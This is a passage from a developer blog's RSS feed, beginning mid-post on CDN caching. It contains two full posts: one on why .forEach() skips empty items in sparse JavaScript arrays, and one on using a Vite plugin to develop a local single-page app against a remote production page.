&lt;code&gt;stale-while-revalidate&lt;/code&gt; called “&lt;a href=&quot;https://bunny.net/blog/introducing-stale-cache-more-efficient-cache-handling/?ref=cms.macarthur.me&quot;&gt;Stale Cache Delivery&lt;/a&gt;.” The main “downside” here is that there isn’t a free tier, and I’m also not that interested in diving into a totally new CDN right now. Not to mention, I’m sure there are other trade-offs I’d need to spend time considering as well (ex: Cloudflare has over double the number of POPs that Bunny does).&lt;/p&gt;&lt;h3&gt;In Fairness, SSG Caching Ain’t Perfect&lt;/h3&gt;&lt;p&gt;It’s really important to note that these caching issues don’t just go away by using Vercel or Netlify. Even for them, cache times are never guaranteed to reach the maximum &lt;code&gt;max-age&lt;/code&gt; header you set. For example, Vercel claims assets are cached for &lt;a href=&quot;https://vercel.com/docs/concepts/edge-network/caching?ref=cms.macarthur.me#x-vercel-cache&quot;&gt;up to 31 days&lt;/a&gt;, by default. But also includes this disclaimer:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/802f4ae5-100d-4ce1-9912-82fe84b11733-2.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;The nice thing, though, is that because the site is statically generated, a fresh request doesn’t need to wait for data to be fetched before the HTML can even be built. Instead, the server just goes back to origin to pick up ready-made HTML files, making those “cold” requests pretty lukewarm.&lt;/p&gt;&lt;h2&gt;Platform FOMO&lt;/h2&gt;&lt;p&gt;Embarking on this journey really made me appreciate some of the things Jamstack-friendly platforms have turned into features we might take for granted. CI/CD is a breeze, leaving very little friction between getting something off your machine and deployed. CDN caching and SSL certificates &lt;em&gt;just work&lt;/em&gt; without you thinking about it. It’s very easy to spin up a branch of your site to a unique, shareable URL. Minimal-config serverless functions provide a means of performing tasks requiring a server (I’ve processed &lt;a href=&quot;https://typeitjs.com/?ref=cms.macarthur.me&quot;&gt;TypeIt&lt;/a&gt; license purchases on a Netlify function for years).&lt;/p&gt;&lt;p&gt;And then there are newer features that begin to blur the traditional line between static and server-rendered sites. A while back, Vercel rolled out &lt;a href=&quot;https://vercel.com/docs/concepts/incremental-static-regeneration/overview?ref=cms.macarthur.me&quot;&gt;incremental static regeneration&lt;/a&gt;, giving your site a proprietary &lt;code&gt;stale-while-revalidate&lt;/code&gt; experience without dealing with a CDN (I’m using this on &lt;a href=&quot;https://macarthur.me/dashboard?ref=cms.macarthur.me&quot;&gt;my personal dashboard&lt;/a&gt; and it works great). Another example is edge functions offered by both &lt;a href=&quot;https://cms.macarthur.me/bda83e1ecfcd46cebf378579633cc85e&quot;&gt;Netlify&lt;/a&gt; and &lt;a href=&quot;https://vercel.com/docs/concepts/functions/edge-functions?ref=cms.macarthur.me&quot;&gt;Vercel&lt;/a&gt;, making it possible to run dynamic, server-side logic real close to your users, rather than only at your origin.&lt;/p&gt;&lt;p&gt;These and other players are pushing the limit hard and fast, and it makes me not want to miss out on the next interesting thing they’ll roll out.&lt;/p&gt;&lt;h2&gt;We’ll See Where this Goes&lt;/h2&gt;&lt;p&gt;I was a little bummed about the time I invested in that Remix rebuild that will probably never see the light of day, but in hindsight, I’m grateful to have learned a &lt;em&gt;ton&lt;/em&gt; in the process, especially with regard to caching and CDNs. I’m also left with a fresh sense of excitement for the Jamstack and some of the innovations its helped shepherd in.&lt;/p&gt;&lt;p&gt;Even so, it’s only a matter of time before I feel the itch to tear all of this down and rebuild it with the next big thing. I’m giving myself six months.&lt;/p&gt;</content:encoded></item><item><title>Why Can’t You .forEach() Over Empty Array Items?</title><link>https://macarthur.me/posts/looping-over-empty-array-items</link><guid isPermaLink="true">https://macarthur.me/posts/looping-over-empty-array-items</guid><pubDate>Thu, 08 Sep 2022 05:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Harken back to a time when you needed to execute some code a specific number of times and had some reason to not use a &lt;code&gt;for&lt;/code&gt; loop. You might’ve made a fresh array with a certain number of items, and then attempted to &lt;code&gt;.forEach()&lt;/code&gt; over it:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const freshArray = new Array(5);

freshArray.forEach(item =&amp;gt; {
	console.log(item);
});
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you did take that approach, you also might’ve expected to see five individual logs for &lt;code&gt;undefined&lt;/code&gt;. &lt;strong&gt;But instead, nothing happened,&lt;/strong&gt; as if the array didn’t have any items to begin with.&lt;/p&gt;&lt;p&gt;That’s because it technically doesn’t. When a number is passed into the &lt;code&gt;Array&lt;/code&gt; constructor, no items are actually defined — not even &lt;code&gt;undefined&lt;/code&gt; ones. Instead, &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Array?ref=cms.macarthur.me#parameters&quot;&gt;only the &lt;/a&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Array?ref=cms.macarthur.me#parameters&quot;&gt;&lt;code&gt;length&lt;/code&gt;&lt;/a&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Array?ref=cms.macarthur.me#parameters&quot;&gt; property is set&lt;/a&gt;, effectively reserving that many seats that may or may not be filled later. You’ve created a &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Indexed_collections?ref=cms.macarthur.me#sparse_arrays&quot;&gt;&lt;em&gt;sparse&lt;/em&gt;&lt;/a&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Indexed_collections?ref=cms.macarthur.me#sparse_arrays&quot;&gt; array.&lt;/a&gt; You can verify that by logging the array itself:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const freshArray = new Array(5);

console.log(freshArray);

// [ &amp;lt;5 empty items&amp;gt; ]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When a method on the &lt;code&gt;Array&lt;/code&gt; prototype (&lt;code&gt;.map()&lt;/code&gt;, &lt;code&gt;.forEach()&lt;/code&gt;, etc.) encounters such an array, it’s designed to &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/forEach?ref=cms.macarthur.me#description&quot;&gt;skip over any uninitialized or deleted items&lt;/a&gt;. The position of those items doesn’t matter. For example, you could designate “empty” items by inserting commas:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const freshArray = [1, 2, , , 5];

console.log(&quot;Length:&quot;, freshArray.length);

freshArray.forEach(item =&amp;gt; {
  console.log(item);
});

// Length: 5
// 1
// 2
// 5
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And even by directly setting them via index:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const freshArray = [];

freshArray[3] = &quot;fourth item!&quot;;

console.log(&quot;Length:&quot;, freshArray.length);

freshArray.forEach((item, index) =&amp;gt; {
  console.log(item, index);
});

// Length: 4
// &quot;fourth item!&quot; 3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you’re dead-set on using methods like &lt;code&gt;.forEach()&lt;/code&gt; or &lt;code&gt;.map()&lt;/code&gt; with a sparse array, you can reach for something like &lt;code&gt;.fill()&lt;/code&gt; to &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/fill?ref=cms.macarthur.me&quot;&gt;populate each empty item&lt;/a&gt; with something first (even &lt;code&gt;undefined&lt;/code&gt;).&lt;/p&gt;&lt;h2&gt;Iterators Are Different, Though&lt;/h2&gt;&lt;p&gt;That said, even those empty items are accessible using the &lt;code&gt;Symbol.iterator&lt;/code&gt; method defined on the &lt;code&gt;Array&lt;/code&gt; prototype. It’s implicitly accessed any time you use a &lt;code&gt;for&lt;/code&gt; loop.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const freshArray = new Array(5);

for (const item of freshArray) {
  console.log(item);
}

// undefined
// undefined
// undefined
// undefined
// undefined
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It’s also in play under the hood when the spread operator is used, which means you could spread your sparse array, and immediately be able to perform a &lt;code&gt;.forEach()&lt;/code&gt; on it:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const freshArray = new Array(5);

// .forEach() will work now!
[...freshArray].forEach((item, index) =&amp;gt; {
  console.log(item, index);
});

// undefined 0
// undefined 1
// undefined 2
// undefined 3
// undefined 4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you wanted, you could use this iteration behavior to make your own variation of &lt;code&gt;.forEach&lt;/code&gt; that’ll handle empty items (tack on methods to prototypes at your own risk!):&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Array.prototype.inclusiveForEach = function(callback) {
  return [...this].forEach(callback);
}

const freshArray = new Array(5);

freshArray.inclusiveForEach((item, index) =&amp;gt; {
  console.log(item, index);
});

// undefined 0
// undefined 1
// undefined 2
// undefined 3
// undefined 4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;All of these decisions are up to you, and highly dependent on your circumstances. At the very least, I hope this helps shed some light on why the code behaves the way it does, and offers some considerations to help you move forward.&lt;/p&gt;</content:encoded></item><item><title>Develop an SPA Against a Remote Page w/ Vite</title><link>https://macarthur.me/posts/project-local-spa-onto-production-page</link><guid isPermaLink="true">https://macarthur.me/posts/project-local-spa-onto-production-page</guid><pubDate>Tue, 06 Sep 2022 05:00:00 GMT</pubDate><content:encoded>&lt;p&gt;More and more frequently, I’ve been working with little small single-page applications that are built independently and then mounted into something more complex. Think of things like interactive calculators, multi-step forms, or other tools intended to plug into a “bigger” page, like one hosted by CMS.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/824e282f-9b3c-4b3f-b3da-e0ca16b5367d-2.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Overall, it’s a helpful approach. Rather than being required to mess with a clunky application in order to work on just a small piece of it, you need to deal only with a little, self-contained application.&lt;/p&gt;&lt;h2&gt;The Inherent Challenge&lt;/h2&gt;&lt;p&gt;But there are some noteworthy challenges. The main one: &lt;strong&gt;you’re building a tool intended to be used in a specific context,&lt;/strong&gt; &lt;em&gt;&lt;strong&gt;totally outside that context&lt;/strong&gt;&lt;/em&gt;&lt;strong&gt;.&lt;/strong&gt; This inevitably brings about some gotchas &amp;amp; annoyances, often after you’ve gone through the work of publishing your latest version of the tool and mounting it to the (let’s assume from here on out it’s a) CMS. You’ll ship it and then find things like this:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Global styles loaded by the CMS are bleeding into your app.&lt;/li&gt;&lt;li&gt;Third-party analytics scripts aren’t tracking the tool’s activity as expected.&lt;/li&gt;&lt;li&gt;A sticky header on the page unexpectedly overlaps part of the tool as someone’s using it.&lt;/li&gt;&lt;li&gt;You didn’t realize a ton of library styles are already being loaded by the CMS, and so you double-shipped a ton of CSS.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Individually, none of these issues are difficult to solve. The problem is that &lt;strong&gt;the feedback loop to become aware of them is too big&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;Thankfully, modern tooling can give us some of the best of both worlds — a snappy, lightweight development experience, &lt;em&gt;and a&lt;/em&gt; local environment that mimics how the tool will &lt;em&gt;actually exist in production&lt;/em&gt;. In particular, Vite makes it real easy.&lt;/p&gt;&lt;h2&gt;Remote Development with Vite&lt;/h2&gt;&lt;p&gt;To be fair, Vite isn’t even the first tool I’ve seen used to project a local SPA onto a remote page — my friend &lt;a href=&quot;https://kroneman.io/?ref=cms.macarthur.me&quot;&gt;Lennart Kroneman&lt;/a&gt; showed me how to do it with Webpack a couple of years ago, and I know other tools are capable of proxying requests in a similar fashion as well. But the ease at which it’s possible with Vite is at a whole different level.&lt;/p&gt;&lt;h3&gt;An Sample Setup&lt;/h3&gt;&lt;p&gt;To prototype this, I’ve made an example “production” page published with Netlify. It’s got a bit of content and a little SPA mounted to it (”My Production App”). If you’d like to dabble, &lt;a href=&quot;https://github.com/alexmacarthur/vite-proxy-demo?ref=cms.macarthur.me&quot;&gt;the repository lives here&lt;/a&gt;, and the &lt;a href=&quot;https://vite-proxy-demo.netlify.app/some-page/?ref=cms.macarthur.me&quot;&gt;published page is here&lt;/a&gt;. Just pretend it’s a published page hosted by an enterprise CMS.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/04a2f25b-a097-43a8-bb5d-cf33c2b37288-4.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Rendered between the page’s content is an empty DOM node used to mount the app, and a script tag to load the bundle:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- app mounted here --&amp;gt;
&amp;lt;div id=&quot;app&quot;&amp;gt;&amp;lt;/div&amp;gt;

&amp;lt;!-- app&apos;s bundle loaded here --&amp;gt;
&amp;lt;script type=&quot;module&quot; src=&quot;/static/production-bundle.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3&gt;Our Little App’s Vite Configuration&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;vite.config.js&lt;/code&gt; file for our little, independent app is pretty simple at this point, simply defining how the package will be bundled on &lt;code&gt;build&lt;/code&gt;.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { resolve } from &quot;path&quot;;
import { defineConfig } from &quot;vite&quot;;
import preact from &quot;@preact/preset-vite&quot;;

export default defineConfig({
	plugins: [preact()],
	build: {
		lib: {
			entry: resolve(__dirname, &quot;app.jsx&quot;),
			name: &quot;MyApp&quot;,
			fileName: () =&amp;gt; &quot;production-bundle.js&quot;,
		},
	},
});
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Even though I’m using Preact, the framework of choice is irrelevant. The basic assumption is that it’s something that mounts to &lt;code&gt;#app&lt;/code&gt; once the bundle loads. Our application code looks like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// app.js

const App = () =&amp;gt; {
	return &amp;lt;h2&amp;gt;My DEVELOPMENT App!&amp;lt;/h2&amp;gt;;
};

export default App;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Which is then locally rendered in a &lt;code&gt;local-dev.jsx&lt;/code&gt; file that’s directly referenced by our &lt;code&gt;index.html&lt;/code&gt; file. This file is only intended to be used for local development. It’ll never be bundled up with the final product.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// local-dev.jsx

import { render } from &quot;preact&quot;;
import App from &quot;./app&quot;;

render(&amp;lt;App /&amp;gt;, document.getElementById(&quot;app&quot;));&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, let’s spin things up. To start, it doesn’t look like much. If all goes well, we’ll end with this same application being rendered locally, but as if it’s on that remote, production page.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/b23647e6-474c-40da-9085-af261718b601-2.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;h2&gt;Manipulating Incoming HTML w/ Vite&lt;/h2&gt;&lt;p&gt;It’s possible to pull all of this off with Vite’s built-in support for &lt;a href=&quot;https://vitejs.dev/config/server-options.html?ref=cms.macarthur.me#server-proxy&quot;&gt;proxying requests&lt;/a&gt;. In fact, when I first started dabbling, this is the approach I took. But because we’re dealing with multiple request types with various sources, it gets cumbersome real quick, and so I don’t even recommend it anymore.&lt;/p&gt;&lt;p&gt;Instead, Vite has a simpler, yet equally effective approach we can take: the &lt;code&gt;transformIndexHtml&lt;/code&gt; hook from its &lt;a href=&quot;https://vitejs.dev/guide/api-plugin.html?ref=cms.macarthur.me#vite-specific-hooks&quot;&gt;plugin API&lt;/a&gt;. When it’s wired up, we have full control over what’s rendered by the local development server with a relatively small amount of code.&lt;/p&gt;&lt;p&gt;We’ll start with a small Vite plugin, whose bones look like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// vite.config.js

const HtmlRewriter = () =&amp;gt; ({
	name: &quot;html-rewriter&quot;,

	async transformIndexHtml(html) {
		// Transformation happens here.
		return html;
	},
});

export default defineConfig({
	// Plugin registered here:
	plugins: [preact(), HtmlRewriter()],

	// ... the rest of our config.
});
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this in place, we have full power to do whatever we want with that HTML, like completely swap out all of the HTML for “your mom”:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const HtmlRewriter = () =&amp;gt; ({
  name: &quot;html-rewriter&quot;,

	async transformIndexHtml(html) {
		return &quot;your mom&quot;;
	},
});
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Or, the HTML for a different page altogether:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const HtmlRewriter = () =&amp;gt; ({
  name: &quot;html-rewriter&quot;,

  async transformIndexHtml(html) {
		// Request the remote page.
		const response = await fetch(
			&quot;https://vite-proxy-demo.netlify.app/some-page/&quot;
		);

		// Return the HTML.
		return response.text();
  },
});
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At this point, if you were to reload our local application, it’d look exactly like that remote page we’re targeting, even though we’re serving it on &lt;code&gt;localhost&lt;/code&gt;.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/04a2f25b-a097-43a8-bb5d-cf33c2b37288-5.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;The next step is to surgically rewrite the script tag to point to our &lt;em&gt;development&lt;/em&gt; version of the application, rather than the one that’s currently rendering.&lt;/p&gt;&lt;h2&gt;Hijacking the Root Node&lt;/h2&gt;&lt;p&gt;This’ll highly depend on how your production bundle is being loaded for a page you’re targeting. But for us, the application code is being loaded from a CloudFront URL. All we’ll do is target that remote script and swap it out for our local &lt;code&gt;local-dev.jsx&lt;/code&gt;. Notice that since we’ll be serving it locally, we can even stick to using a relative path.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const HtmlRewriter = () =&amp;gt; ({
  name: &quot;html-rewriter&quot;,

  async transformIndexHtml(html) {
    const response = await fetch(
      &quot;https://vite-proxy-demo.netlify.app/some-page/&quot;
    );
    const remoteHtml = await response.text();

-   return remoteHtml;
+   return remoteHtml.replace(
+     /(https:\/\/(.*?)cloudfront\.net(.*?)production-bundle\.js)/,
+     `./local-dev.jsx`
+   );
  },
});
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you refresh the page, you’ll see &lt;em&gt;nearly&lt;/em&gt; the same result as before. All code is coming in from a production page &lt;em&gt;except&lt;/em&gt; the script we targeted. And because of this, it’s our &lt;em&gt;local version&lt;/em&gt; of the application running on the page — no longer the remote one.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/211f9c5e-d403-4dd2-ad02-36808b9293ea-2.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;With that, we’re largely set. We can iterate on our application with a far less chance of interference from unexpected code running on the page, without running any other application locally.&lt;/p&gt;&lt;h2&gt;Avoiding a Couple of Gotchas&lt;/h2&gt;&lt;p&gt;Before we’re wrapped up, there are a couple more things to keep in mind as you implement any of this:&lt;/p&gt;&lt;p&gt;&lt;strong&gt;#1: Guarantee hot module reloading fires consistently.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;I initially ran into some issues with changes not being propagated through Vite to the browser consistently. In order to guarantee that they do, include &lt;a href=&quot;http://import.meta.hot/?ref=cms.macarthur.me&quot;&gt;&lt;code&gt;import.meta.hot&lt;/code&gt;&lt;/a&gt; in your entry point file:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// local-dev.jsx

+ import.meta.hot;

import { render } from &quot;preact&quot;;
import App from &quot;./app&quot;;

render(&amp;lt;App /&amp;gt;, document.getElementById(&quot;app&quot;));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That single line will force Vite to fully propagate an update, trigging a module reload, and keeping your development experience snappy:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/dc22d28b-99d7-4faf-9c0e-c3a6e6fc92f9-1.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;#2: Your&lt;/strong&gt; &lt;strong&gt;&lt;code&gt;script&lt;/code&gt;&lt;/strong&gt; &lt;strong&gt;tag&lt;/strong&gt; &lt;em&gt;&lt;strong&gt;must&lt;/strong&gt;&lt;/em&gt; &lt;strong&gt;have a&lt;/strong&gt; &lt;strong&gt;&lt;code&gt;type=&quot;module&quot;&lt;/code&gt;&lt;/strong&gt; &lt;strong&gt;attribute on it.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Without it, Vite won’t be able to load and execute your local entry point. It’s a small thing that may also be easily remedied by HTML rewriting again. Nevertheless, it can trip you up.&lt;/p&gt;&lt;h2&gt;All this in a Plugin&lt;/h2&gt;&lt;p&gt;I’ve quickly found myself implementing this setup in multiple projects, so I wrapped it up in a plugin: &lt;a href=&quot;https://github.com/alexmacarthur/vite-plugin-proxy-page?ref=cms.macarthur.me&quot;&gt;vite-plugin-proxy-page&lt;/a&gt;. It’s been tested in a variety of different projects, and you’re welcome to leverage it too. As an added benefit, there are a few other nice-to-haves handled by it too. Things like:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Locally caching the remote HTML so you’re not refetching it on every page load.&lt;/li&gt;&lt;li&gt;Being able to &lt;em&gt;create&lt;/em&gt; a root node in the remote page’s HTML if it doesn’t already exist (and mount it in the correct spot).&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;Tightening the Feedback Loop&lt;/h2&gt;&lt;p&gt;Embracing these tactics has done some wonders for shrinking the formerly gigantic feedback loop we’d otherwise need to navigate when building in this sort of architecture. Hoping it does the same for you!&lt;/p&gt;</content:encoded></item></channel></rss>